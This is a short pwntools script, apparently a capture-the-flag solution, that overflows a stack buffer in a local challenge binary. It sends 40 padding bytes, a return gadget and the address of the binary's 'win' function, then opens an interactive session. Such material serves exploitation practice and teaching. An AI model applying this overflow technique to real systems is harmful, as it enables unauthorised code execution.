from pwn import *

elf = context.binary = ELF('./chall')

HOST,PORT = '',0
if len(sys.argv)> 1:
    p = remote(HOST,PORT)
else:
    p = process()
    #attach(p)

ret_adr = 0x000000000040101a 
p.sendlineafter(b'[X] BOF:',b'A'*40+p64(ret_adr)+p64(elf.sym.win))
p.interactive()